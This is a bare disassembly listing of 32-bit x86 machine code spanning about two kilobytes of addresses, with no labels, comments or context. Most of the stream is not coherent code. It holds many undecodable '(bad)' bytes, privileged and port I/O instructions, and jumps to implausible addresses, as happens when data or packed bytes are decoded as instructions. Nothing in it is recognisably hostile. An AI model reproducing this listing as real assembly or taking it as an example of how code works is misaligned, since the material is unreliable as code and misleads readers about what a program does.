  431871:	rol    BYTE PTR [ebp-0x7c],0xeb
  431875:	add    edi,edi
  431877:	add    al,ch
  431879:	inc    ebp
  43187a:	push   ecx
  43187b:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431881:	mov    al,0xc7
  431883:	test   esp,esp
  431885:	clc    
  431886:	test   DWORD PTR [ebp-0x8],ecx
  431889:	add    BYTE PTR [ebp+0x51],0x39
  43188d:	jmp    0x8bcca12e
  431892:	in     al,dx
  431893:	or     BYTE PTR [ebp-0xf],al
  431896:	xor    eax,DWORD PTR [eax+0x4f896703]
  43189c:	hlt    
  43189d:	mov    eax,DWORD PTR [ebp-0x50]
  4318a0:	xor    esi,ecx
  4318a2:	add    eax,DWORD PTR [eax+0x4f086789]
  4318a8:	inc    ebp
  4318a9:	adc    esi,0x68
  4318ac:	pushf  
  4318ad:	inc    edi
  4318af:	add    al,ch
  4318b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4318b2:	test   edi,edi
  4318b4:	clc    
  4318b5:	inc    DWORD PTR [ebp-0x73]
  4318b8:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4318bc:	(bad)  
  4318bd:	push   ecx
  4318be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318bf:	jne    0x431846
  4318c1:	push   eax
  4318c2:	clc    
  4318c3:	test   DWORD PTR [ebp-0x1],eax
  4318c6:	cmp    eax,0xc78b9cff
  4318cb:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4318d2:	inc    ebp
  4318d3:	push   edi
  4318d4:	aas    
  4318d5:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4318dc:	dec    ebp
  4318dd:	add    BYTE PTR [ebx],dh
  4318df:	inc    ebp
  4318e0:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4318e6:	enter  0x8401,0x0
  4318ea:	add    al,BYTE PTR [eax]
  4318ec:	add    bh,bh
  4318ee:	out    dx,eax
  4318ef:	sbb    BYTE PTR [eax],al
  4318f1:	dec    ebp
  4318f2:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4318f8:	sub    esi,DWORD PTR [ebx]
  4318fa:	mov    ebp,DWORD PTR [eax-0x8]
  4318fd:	add    bl,0x0
  431900:	(bad)  
  431901:	cmp    eax,ecx
  431903:	or     BYTE PTR [edx+0x750114],al
  431909:	inc    DWORD PTR [ebp+0x18]
  43190c:	mov    eax,DWORD PTR [ebp-0x8]
  43190f:	mov    ebx,eax
  431911:	(bad)  
  431912:	retf   
  431913:	inc    ebp
  431914:	into   
  431915:	mov    esi,eax
  431917:	int3   
  431918:	scas   eax,DWORD PTR es:[edi]
  431919:	push   es
  43191a:	mov    esi,DWORD PTR [ebp-0xc]
  43191d:	call   DWORD PTR [ebp+0x18]
  431920:	sub    edi,DWORD PTR [ebp+0x3b]
  431923:	mov    esi,DWORD PTR [edi-0x34]
  431926:	mov    eax,DWORD PTR [ebp-0x8]
  431929:	ss ret 
  43192b:	pushf  
  43192c:	mov    bh,0xbc
  43192f:	fadd   QWORD PTR [eax]
  431931:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  431937:	mov    esi,DWORD PTR [ebx]
  431939:	in     al,0x33
  43193b:	ret    
  43193c:	add    eax,esi
  43193e:	add    eax,DWORD PTR [ebp+0xf]
  431941:	mov    eax,ecx
  431943:	in     al,0x4d
  431945:	ret    
  431946:	mov    eax,esi
  431948:	in     al,dx
  431949:	inc    ebp
  43194a:	rol    edi,1
  43194c:	sar    al,1
  43194e:	or     BYTE PTR [ebp+0x45e9f845],al
  431954:	add    BYTE PTR [eax],bh
  431956:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  43195d:	test   ebx,eax
  43195f:	clc    
  431960:	retf   
  431961:	inc    ebp
  431962:	into   
  431963:	cmp    al,dh
  431965:	pushf  
  431966:	scas   eax,DWORD PTR es:[edi]
  431967:	(bad)  
  431968:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  43196f:	inc    ebp
  431970:	cmp    edi,DWORD PTR [edi+esi*2]
  431973:	pushf  
  431974:	mov    eax,edi
  431976:	mov    esp,0x458567a8
  43197b:	clc    
  43197c:	mov    eax,DWORD PTR [ebp-0x8]
  43197f:	mov    eax,ebx
  431981:	in     al,dx
  431982:	retf   
  431983:	ret    
  431984:	into   
  431985:	mov    dh,0x7d
  431988:	scas   eax,DWORD PTR es:[edi]
  431989:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  43198f:	add    BYTE PTR [ebx],ch
  431991:	jmp    0xba1ad1
  431996:	mov    eax,DWORD PTR [ebp-0x5c]
  431999:	mov    eax,DWORD PTR [ebp-0x14]
  43199c:	inc    ebp
  43199d:	enter  0x458b,0xf8
  4319a1:	xor    eax,ebx
  4319a3:	add    ecx,ebx
  4319a5:	cmp    ecx,esi
  4319a7:	shufps xmm7,xmm4,0xaf
  4319ab:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4319b1:	dec    ebp
  4319b2:	sub    esi,DWORD PTR [ebx]
  4319b4:	cmp    esi,DWORD PTR [ebx]
  4319b6:	ja     0x4319bb
  4319b8:	mov    eax,DWORD PTR [ebx]
  4319ba:	lods   al,BYTE PTR ds:[esi]
  4319bb:	mov    db0,ecx
  4319be:	inc    ebp
  4319bf:	dec    ebp
  4319c0:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4319c6:	retf   
  4319c7:	rol    dh,1
  4319c9:	or     al,0xce
  4319cb:	inc    ebp
  4319cc:	scas   eax,DWORD PTR es:[edi]
  4319cd:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4319d3:	add    BYTE PTR [ebx],ch
  4319d5:	add    BYTE PTR [ebx],bh
  4319d7:	inc    ebp
  4319d8:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4319de:	inc    ebp
  4319df:	retf   
  4319e0:	mov    ecx,esi
  4319e2:	clc    
  4319e3:	(bad)  
  4319e4:	retf   
  4319e5:	scas   eax,DWORD PTR es:[edi]
  4319e6:	ret    
  4319e7:	mov    ecx,esi
  4319e9:	hlt    
  4319ea:	(bad)  
  4319eb:	push   ebp
  4319ec:	scas   eax,DWORD PTR es:[edi]
  4319ed:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4319f3:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4319f9:	add    BYTE PTR [ebx],al
  4319fb:	mov    eax,eax
  4319fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4319fe:	inc    ebp
  4319ff:	dec    ebp
  431a00:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431a08:	inc    ebp
  431a09:	(bad)  
  431a0b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431a13:	sar    eax,1
  431a15:	rol    BYTE PTR [ebp+0x5],1
  431a18:	xor    eax,DWORD PTR [ebp+0x3]
  431a1b:	jmp    0x431a08
  431a1d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431a23:	xor    eax,DWORD PTR [ebp+0x33]
  431a26:	mov    eax,DWORD PTR [ebx]
  431a28:	rol    BYTE PTR [ebx],1
  431a2a:	test   BYTE PTR [edi],cl
  431a2c:	cdq    
  431a2d:	shl    DWORD PTR [edx],0x4d
  431a30:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431a36:	xor    edx,eax
  431a38:	add    eax,DWORD PTR ds:0xeb4d45e0
  431a3e:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431a44:	add    BYTE PTR [ebx],dh
  431a46:	inc    ebp
  431a47:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  431a4d:	rdpmc  
  431a4f:	rol    DWORD PTR [ebx],0x4d
  431a52:	loopne 0x4319df
  431a54:	push   ebp
  431a55:	in     al,dx
  431a56:	mov    cl,dl
  431a58:	adc    eax,edx
  431a5a:	jb     0x431a61
  431a5c:	add    BYTE PTR [ebp+0x45],al
  431a5f:	jmp    0x4319ec
  431a61:	mov    ebx,eax
  431a63:	test   al,0xcb
  431a65:	dec    ebp
  431a66:	dec    ebp
  431a67:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  431a6d:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431a73:	dec    ebp
  431a74:	mov    al,0x8b
  431a76:	dec    ebp
  431a77:	in     al,dx
  431a78:	xor    edx,ecx
  431a7a:	xor    edx,eax
  431a7c:	add    eax,DWORD PTR [ebp+0x3]
  431a7f:	jbe    0x431a90
  431a81:	mov    eax,ecx
  431a83:	test   al,0x45
  431a85:	dec    ebp
  431a86:	mov    DWORD PTR [ebx],esi
  431a88:	loopne 0x431abd
  431a8a:	inc    ebp
  431a8b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431a91:	rol    esi,0x45
  431a94:	scas   eax,DWORD PTR es:[edi]
  431a95:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  431a9b:	mov    eax,ecx
  431a9d:	hlt    
  431a9e:	dec    ebp
  431a9f:	inc    ebp
  431aa0:	mov    eax,edi
  431aa2:	loopne 0x431a7c
  431aa4:	retf   
  431aa5:	test   esi,ecx
  431aa7:	clc    
  431aa8:	scas   eax,DWORD PTR es:[edi]
  431aa9:	inc    ebp
  431aaa:	mov    eax,edi
  431aac:	fdiv   st,st(0)
  431aae:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  431ab4:	cdq    
  431ab5:	cmp    BYTE PTR [edx],dh
  431ab7:	pushf  
  431ab8:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  431abe:	inc    esi
  431ac0:	mov    ebp,DWORD PTR [eax-0x10]
  431ac3:	inc    ebp
  431ac4:	dec    ebp
  431ac5:	xor    esi,DWORD PTR [ebx]
  431ac7:	add    eax,DWORD PTR [ebx]
  431ac9:	loopne 0x431ada
  431acb:	dec    ebp
  431acc:	ror    DWORD PTR [edx+0x7233084d],0x3
  431ad3:	add    BYTE PTR [ebx-0x7b740bbb],cl
  431ad9:	lock cdq 
  431adb:	ret    
  431adc:	xor    al,BYTE PTR [ebp-0x77]
  431adf:	mov    esi,esp
  431ae1:	rol    BYTE PTR [ebp-0x7c],1
  431ae4:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  431aea:	call   edi
  431aec:	enter  0x4d45,0x8b
  431af0:	mov    esi,eax
  431af2:	fmul   st(3),st
  431af4:	push   ebp
  431af5:	dec    ebp
  431af6:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  431afc:	ret    0xc199
  431aff:	xor    al,BYTE PTR [esi-0x280276]
  431b05:	dec    ebp
  431b06:	jne    0x431b3b
  431b08:	mov    eax,DWORD PTR [ebx]
  431b0a:	cld    
  431b0b:	loopne 0x431abd
  431b0d:	push   ebp
  431b0e:	add    DWORD PTR [eax+0x72851100],ecx
  431b14:	inc    DWORD PTR [eax]
  431b16:	inc    DWORD PTR [ebp-0x75]
  431b19:	mov    edi,esp
  431b1b:	lock add bl,0x1
  431b1f:	retf   
  431b20:	add    dh,al
  431b22:	xor    dh,cl
  431b24:	inc    ebp
  431b25:	scas   eax,DWORD PTR es:[edi]
  431b26:	mov    eax,DWORD PTR [ebx]
  431b28:	shl    al,0x0
  431b2b:	inc    ebp
  431b2c:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431b32:	call   0x462d6a
  431b37:	ud0    eax,ecx
  431b3a:	adc    al,0x4d
  431b3c:	inc    ebp
  431b3d:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431b43:	lock push 0x338055
  431b49:	add    eax,DWORD PTR [eax]
  431b4b:	ud0    ecx,edx
  431b4e:	sbb    BYTE PTR [ebp+0x5e],dl
  431b51:	xor    ecx,ecx
  431b53:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431b5a:	push   ecx
  431b5b:	add    BYTE PTR [ebp-0x38],cl
  431b5e:	mov    DWORD PTR [esi-0x740004],eax
  431b64:	cld    
  431b65:	inc    ebp
  431b66:	nop
  431b67:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431b6d:	xabort 0xaf
  431b70:	icebp  
  431b71:	mov    esi,DWORD PTR [ebp-0x28]
  431b74:	(bad)  
  431b75:	retf   
  431b76:	or     ecx,eax
  431b78:	(bad)  
  431b79:	dec    ebp
  431b7a:	pop    es
  431b7b:	(bad)  
  431b7c:	(bad)  
  431b7d:	or     BYTE PTR [esi],al
  431b7f:	jb     0x431b47
  431b81:	add    BYTE PTR [ebx],al
  431b83:	inc    ebp
  431b84:	(bad)  
  431b85:	mov    ecx,DWORD PTR [edx]
  431b87:	fadd   st(6),st
  431b89:	ret    
  431b8a:	add    ah,BYTE PTR [edi-0x37]
  431b8d:	int    0x55
  431b8f:	sub    ebp,esp
  431b91:	add    edx,DWORD PTR [ecx-0x14]
  431b94:	inc    ebp
  431b95:	inc    ebp
  431b96:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431b9c:	cld    
  431b9d:	(bad)  
  431b9e:	mov    WORD PTR [edi+0xf893be0],gs
  431ba4:	mov    ebp,ebp
  431ba6:	clc    
  431ba7:	push   eax
  431ba9:	push   DWORD PTR [ebp-0x4]
  431bac:	mov    BYTE PTR [ebp+0xa],0xff
  431bb0:	(bad)  
  431bb1:	int3   
  431bb2:	or     BYTE PTR [eax],al
  431bb4:	(bad)  
  431bb5:	lea    eax,[edi]
  431bb7:	ins    BYTE PTR es:[edi],dx
  431bb8:	(bad)  
  431bb9:	inc    DWORD PTR [ecx]
  431bbb:	push   eax
  431bbc:	mov    BYTE PTR [ebp+0x9],0x8b
  431bc0:	leave  
  431bc1:	les    edx,FWORD PTR [ebp+0x0]
  431bc4:	in     al,dx
  431bc5:	call   DWORD PTR [ecx-0x75]
  431bc8:	inc    ebp
  431bc9:	cld    
  431bca:	mov    DWORD PTR [eax+0x8b01fc],eax
  431bd0:	cld    
  431bd1:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431bd7:	std    
  431bd8:	mov    eax,DWORD PTR [eax]
  431bda:	clc    
  431bdb:	test   eax,esi
  431bdd:	je     0x431c54
  431bdf:	mov    eax,esi
  431be1:	cld    
  431be2:	add    al,0x80
  431be4:	add    WORD PTR [ecx+0x0],ax
  431be8:	fiadd  DWORD PTR [eax]
  431bea:	mov    BYTE PTR [eax],0xd6
  431bed:	push   0xffffffc3
  431bef:	push   edi
  431bf0:	mov    edx,DWORD PTR [eax+0x51]
  431bf3:	pop    edi
  431bf4:	lea    ebx,[ebx-0x8]
  431bf7:	ret    0x45
  431bfa:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431c00:	xchg   eax,edi
  431c02:	mov    DWORD PTR [ebp-0x75],ecx
  431c05:	push   esi
  431c06:	clc    
  431c07:	jne    0x431bd9
  431c09:	mov    ecx,0xf8450b0b
  431c0e:	(bad)  
  431c0f:	push   cs
  431c10:	or     BYTE PTR [ebp-0x3a],dh
  431c13:	cmp    eax,DWORD PTR [ecx]
  431c15:	pop    esi
  431c16:	(bad)  
  431c17:	or     al,0x5
  431c19:	inc    eax
  431c1a:	leave  
  431c1b:	jmp    0x40cf:0x21564204
  431c22:	leave  
  431c23:	jmp    0xdace5d27
  431c28:	mov    eax,DWORD PTR [edx-0x3a]
  431c2b:	jle    0x431c23
  431c2d:	inc    eax
  431c2e:	nop
  431c2f:	in     al,dx
  431c30:	inc    ebx
  431c32:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431c38:	add    eax,0xff45e8f8
  431c3d:	push   esi
  431c3e:	push   DWORD PTR [ebp-0x39]
  431c41:	mov    eax,0x7e9da46
  431c46:	or     al,0x6
  431c48:	push   DWORD PTR [ebp-0x3a]
  431c4b:	cmp    eax,DWORD PTR [edx]
  431c4d:	pop    esi
  431c4e:	ret    
  431c4f:	or     al,0x56
  431c51:	inc    ecx
  431c52:	push   ebp
  431c53:	jle    0x431c41
  431c55:	inc    edx
  431c56:	inc    ebp
  431c57:	leave  
  431c58:	add    DWORD PTR [ecx+0x28],eax
  431c5b:	and    esp,edi
  431c5d:	inc    ecx
  431c5e:	jne    0x431c47
  431c60:	add    DWORD PTR [edx+0x1c],eax
  431c63:	retf   0xc38b
  431c66:	adc    al,0x8b
  431c68:	xchg   edx,eax
  431c69:	push   ecx
  431c6a:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431c70:	rcl    DWORD PTR [esi-0x9],cl
  431c73:	jne    0x431cc5
  431c75:	mov    eax,0x7c80ece
  431c7a:	rol    DWORD PTR [esi],cl
  431c7c:	div    DWORD PTR [ebp+0x50]
  431c7f:	cmp    ecx,edx
  431c81:	pop    esi
  431c82:	dec    BYTE PTR [edx]
  431c84:	in     al,dx
  431c85:	inc    edx
  431c86:	sub    ebp,ebp
  431c88:	inc    eax
  431c89:	(bad)  
  431c8a:	push   eax
  431c8b:	add    edx,DWORD PTR [eax-0x13]
  431c8e:	push   edi
  431c8f:	add    dh,dh
  431c91:	leave  
  431c92:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431c96:	add    BYTE PTR [ecx+0x0],dl
  431c99:	inc    ebp
  431c9a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431ca0:	add    BYTE PTR [eax-0x7fbf448],bh
  431ca6:	add    al,0x2
  431ca8:	jmp    0x57ec802
  431cad:	jne    0x431c97
  431caf:	mov    eax,DWORD PTR [edx]
  431cb1:	or     BYTE PTR [eax],al
  431cb3:	inc    ecx
  431cb4:	stc    
  431cb5:	jmp    0xe7825cf0
  431cba:	jge    0x431cfd
  431cbc:	mov    esi,ebp
  431cbe:	lock ret 0x7d
  431cc2:	and    ecx,DWORD PTR [ebx-0x171777]
  431cc8:	add    bh,bh
  431cca:	aad    0xd7
  431ccc:	add    dh,cl
  431cce:	clts   
  431cd0:	(bad)  
  431cd1:	call   0xffce1bd6
  431cd6:	hlt    
  431cd7:	iret   
  431cd8:	jge    0x431cb0
  431cda:	rol    DWORD PTR [esi-0x80],cl
  431cdd:	cmc    
  431cde:	or     BYTE PTR [edi-0x27],cl
  431ce1:	(bad)  
  431ce2:	out    dx,al
  431ce3:	mov    eax,DWORD PTR [ebx]
  431ce5:	(bad)  
  431ce6:	pop    esi
  431ce7:	push   es
  431ce8:	cmp    al,0xe8
  431cea:	sar    edi,0x8
  431ced:	inc    DWORD PTR [edi]
  431cef:	inc    esi
  431cf0:	(bad)  
  431cf1:	in     al,dx
  431cf2:	jle    0x431d4b
  431cf4:	push   cs
  431cf5:	push   ebx
  431cf6:	add    BYTE PTR [ebx+0x24008b56],cl
  431cfc:	add    BYTE PTR [ebp+0x50],al
  431cff:	push   eax
  431d00:	add    DWORD PTR [ebx+0x757d1834],ecx
  431d06:	sub    edx,DWORD PTR [esi-0x24]
  431d09:	jne    0x431cc1
  431d0b:	lods   eax,DWORD PTR ds:[esi]
  431d0c:	mov    edx,DWORD PTR [edx-0x34]
  431d0f:	dec    esi
  431d10:	out    0x83,eax
  431d12:	into   
  431d13:	push   edi
  431d15:	loopne 0x431ce5
  431d17:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431d1b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431d22:	rol    DWORD PTR [edx],0x8
  431d25:	mov    esp,ecx
  431d27:	cmp    DWORD PTR [ebx],0xc
  431d2a:	mov    esi,0x5001c0
  431d2f:	push   eax
  431d30:	push   cs
  431d31:	push   eax
  431d32:	(bad)  
  431d33:	sub    edx,edi
  431d35:	push   esi
  431d36:	adc    al,0xcb
  431d38:	ins    DWORD PTR es:[edi],dx
  431d39:	mov    eax,0x203e8
  431d3e:	add    al,ah
  431d40:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431d47:	add    dh,al
  431d49:	add    ah,ch
  431d4b:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431d51:	pop    ecx
  431d52:	or     eax,ebx
  431d54:	cli    
  431d55:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431d5b:	lea    ebp,[ebx]
  431d5d:	mov    edx,DWORD PTR [edx-0x4]
  431d60:	dec    ecx
  431d61:	inc    ebp
  431d62:	shr    BYTE PTR [ebx],0x4b
  431d65:	and    al,0x0
  431d67:	(bad)  
  431d68:	jne    0x431daf
  431d6a:	pop    eax
  431d6b:	mov    al,0x5a
  431d6d:	call   0x1421fcc
  431d72:	and    al,0x85
  431d74:	push   edx
  431d75:	add    BYTE PTR [eax+eax*1+0x0],ah
  431d79:	dec    ebp
  431d7a:	mov    cl,0x23
  431d7c:	jmp    0x431d6a
  431d7e:	mov    al,0xe7
  431d80:	call   0x139206e
  431d85:	shr    DWORD PTR [eax+ebx*2],cl
  431d88:	lock (bad) 
  431d8a:	adc    eax,0x757f008d
  431d8f:	out    0x58,eax
  431d91:	cmp    al,0x7
  431d93:	pop    edx
  431d94:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431d9b:	push   ecx
  431d9c:	cld    
  431d9d:	mov    esi,0x3b0175
  431da2:	and    al,0xb0
  431da4:	xor    BYTE PTR [edx+0x1],0x8b
  431da8:	add    ah,bh
  431daa:	mov    edi,DWORD PTR [ebp-0x4]
  431dad:	psubsw mm7,QWORD PTR [edi]
  431db0:	add    DWORD PTR [ebp+0x0],ebp
  431db3:	rcr    eax,1
  431db5:	mov    edi,ecx
  431db7:	and    eax,DWORD PTR [eax]
  431db9:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431dbf:	call   0x13020a8
  431dc4:	add    al,cl
  431dc6:	mov    ebp,esi
  431dc8:	aam    0x83
  431dca:	or     DWORD PTR [ecx],eax
  431dcc:	jne    0x431dbf
  431dce:	mov    eax,DWORD PTR [eax]
  431dd0:	aam    0x0
  431dd2:	dec    ebp
  431dd3:	jne    0x431d60
  431dd5:	cmp    ebx,eax
  431dd7:	jb     0x431e26
  431dd9:	jmp    0x431d66
  431ddb:	mov    ebx,esp
  431ddd:	int3   
  431dde:	dec    ebp
  431ddf:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431de6:	mov    edx,0x8b0a8b
  431deb:	cmp    ecx,DWORD PTR [eax]
  431ded:	jb     0x431dc6
  431def:	pop    edx
  431df0:	push   edi
  431df1:	cli    
  431df2:	pop    es
  431df3:	mov    eax,ecx
  431df5:	jb     0x431df9
  431df7:	add    DWORD PTR [ebx],0xa
  431dfa:	mov    eax,DWORD PTR [ebx]
  431dfc:	int3   
  431dfd:	add    bh,BYTE PTR [esi+0x75d10006]
  431e03:	jmp    0x431d90
  431e05:	mov    al,0xe8
  431e07:	call   0x1042089
  431e0c:	add    edx,DWORD PTR [ecx+ecx*8]
  431e0f:	pop    edi
  431e10:	or     BYTE PTR [ecx-0x73],bl
  431e13:	pop    ecx
  431e14:	inc    edi
  431e15:	xor    al,0xeb
  431e17:	push   ecx
  431e18:	mov    edi,DWORD PTR [edx+0xc506cc]
  431e1e:	call   0xb21f23
  431e23:	int3   
  431e24:	sbb    BYTE PTR [esi],ch
  431e26:	inc    ebp
  431e27:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431e2d:	call   0x9c209c
  431e32:	or     BYTE PTR [ebx-0x73],dl
  431e35:	cmp    al,0x47
  431e37:	mov    al,0x1
  431e39:	jb     0x431e3b
  431e3b:	mov    al,0x10
  431e3d:	push   eax
  431e3e:	add    al,0x75
  431e40:	add    BYTE PTR [ebx],ch
  431e42:	add    ebx,esp
  431e44:	int3   
  431e45:	jne    0x431e57
  431e47:	movsx  edx,cl
  431e4a:	add    DWORD PTR [eax],eax
  431e4c:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431e53:	mov    gs,edi
  431e55:	add    BYTE PTR [eax-0x50],ch
  431e58:	add    al,ch
  431e5a:	mov    eax,DWORD PTR [ecx]
  431e5c:	sub    eax,DWORD PTR [eax]
  431e5e:	jb     0x431ed5
  431e60:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431e64:	jge    0x431e4e
  431e66:	add    al,0x1
  431e68:	add    DWORD PTR [eax],0x0
  431e6b:	jne    0x431e6d
  431e6d:	je     0x431eb4
  431e6f:	mov    eax,DWORD PTR [edi]
  431e71:	ror    BYTE PTR [ebp+0x4d],1
  431e74:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431e7b:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431e81:	mov    DWORD PTR [ebx],ebp
  431e83:	fadd   DWORD PTR [eax+0x75]
  431e86:	inc    eax
  431e87:	pop    eax
  431e88:	lea    ebx,[ecx+0x4f]
  431e8b:	push   0xb1000003
  431e90:	out    dx,eax
  431e91:	add    ebp,DWORD PTR [edx+edx*2]
  431e94:	add    BYTE PTR [ebx+ecx*4],bh
  431e97:	mov    ch,BYTE PTR [ebx]
  431e99:	jb     0x431f0d
  431e9b:	add    al,0x89
  431e9d:	push   eax
  431e9e:	call   0x842b6c10
  431ea3:	add    DWORD PTR [eax+eax*1],eax
  431ea6:	jae    0x431ebc
  431ea8:	icebp  
  431ea9:	inc    ebp
  431eaa:	mov    eax,DWORD PTR gs:[ecx]
  431ead:	int3   
  431eae:	out    dx,al
  431eaf:	loopne 0x431efe
  431eb1:	sub    eax,DWORD PTR [edx]
  431eb3:	push   0xffffff83
  431eb5:	pop    esi
  431eb6:	push   cs
  431eb7:	jl     0x431ed2
  431eb9:	add    al,0xaf
  431ebb:	xor    eax,0x832b6d00
  431ec0:	mov    eax,DWORD PTR [edx]
  431ec2:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431ec8:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431ece:	inc    ebp
  431ecf:	shr    ebx,0x3
  431ed2:	or     DWORD PTR [eax],0x4
  431ed5:	push   0xffffffa5
  431ed7:	pop    esi
  431ed8:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431edf:	jmp    0x431f3e
  431ee1:	mov    edi,0xff0272
  431ee6:	fdivr  QWORD PTR [ebp+0x5d]
  431ee9:	push   0x4e
  431eeb:	pop    ecx
  431eec:	call   0x4362f1
  431ef1:	mov    DWORD PTR [ebx],eax
  431ef3:	in     al,0xc8
  431ef5:	rol    BYTE PTR [ebp-0x75],0xc1
  431ef9:	call   0xad20da
  431efe:	pop    esi
  431eff:	enter  0xceff,0x8b
  431f03:	repz mov ecx,DWORD PTR [ebp-0x34]
  431f07:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431f0e:	je     0x431f10
  431f10:	or     DWORD PTR [ebx-0x74183b24],eax
  431f16:	jne    0x431efc
  431f18:	jmp    0x431f13
  431f1a:	push   DWORD PTR [edx-0x24]
  431f1d:	push   0x4d
  431f1f:	pop    ecx
  431f20:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431f24:	jge    0x431f2c
  431f26:	mov    eax,eax
  431f28:	sub    ebp,DWORD PTR [edx+0x24]
  431f2b:	pop    esi
  431f2c:	inc    ebp
  431f2d:	mov    esp,0x8b6077
  431f32:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431f38:	lods   al,BYTE PTR ds:[esi]
  431f39:	add    BYTE PTR [ebx],bh
  431f3b:	enter  0xce73,0x49
  431f3f:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431f47:	stc    
  431f48:	jge    0x431fbc
  431f4a:	jnp    0xdd42a2b9
  431f50:	call   0xc62026
  431f55:	fadd   st(0),st
  431f57:	dec    esi
  431f58:	ins    BYTE PTR es:[edi],dx
  431f59:	stc    
  431f5a:	cmp    al,0x73
  431f5c:	push   ebp
  431f5d:	mov    eax,0xf8028b
  431f62:	jne    0x431f25
  431f64:	mov    esi,ecx
  431f66:	mov    esp,DWORD PTR [ebp+0x2c]
  431f69:	add    edi,DWORD PTR [ebp-0x24]
  431f6c:	sub    esp,eax
  431f6e:	and    al,0x45
  431f70:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431f76:	sbb    al,0xee
  431f78:	pop    esi
  431f79:	call   0x831fa9
  431f7e:	fsubr  st,st(3)
  431f80:	sti    
  431f81:	add    BYTE PTR gs:[ecx],bh
  431f84:	add    eax,esp
  431f86:	add    DWORD PTR [esi],eax
  431f88:	rol    DWORD PTR [ebp+0x8],0x29
  431f8c:	mov    esp,eax
  431f8e:	clc    
  431f8f:	jne    0x432006
  431f91:	mov    eax,0x8b0673
  431f96:	loopne 0x431fdd
  431f98:	loopne 0x431f23
  431f9a:	lods   al,BYTE PTR ds:[esi]
  431f9b:	int3   
  431f9c:	inc    ebp
  431f9d:	mov    DWORD PTR gs:[eax+edi*8],eax
  431fa1:	add    al,0xc3
  431fa3:	sub    ecx,DWORD PTR [ebp+0x47]
  431fa6:	(bad)  
  431fa8:	shr    BYTE PTR [ebp-0x1f],0xe8
  431fac:	add    eax,DWORD PTR [eax]
  431fae:	call   0x644e0b3
  431fb3:	add    esi,DWORD PTR [esi-0x3b2efc83]
  431fb9:	dec    esi
  431fba:	ins    DWORD PTR es:[edi],dx
  431fbb:	in     al,dx
  431fbc:	lea    eax,[eax]
  431fbe:	inc    ebp
  431fbf:	inc    ebp
  431fc0:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431fc6:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431fd0:	and    al,0xdc
  431fd2:	ror    DWORD PTR [edx+0x24],0xf7
  431fd6:	or     BYTE PTR [ebp+0x4c],dh
  431fd9:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431fdd:	stos   BYTE PTR es:[edi],al
  431fde:	adc    edx,edi
  431fe0:	inc    esp
  431fe1:	add    edi,DWORD PTR [eax]
  431fe3:	jne    0x431fc8
  431fe5:	mov    DWORD PTR [eax-0x7449db04],ecx
  431feb:	cmp    ecx,DWORD PTR [edi]
  431fed:	sub    BYTE PTR [ebp-0x7e],dl
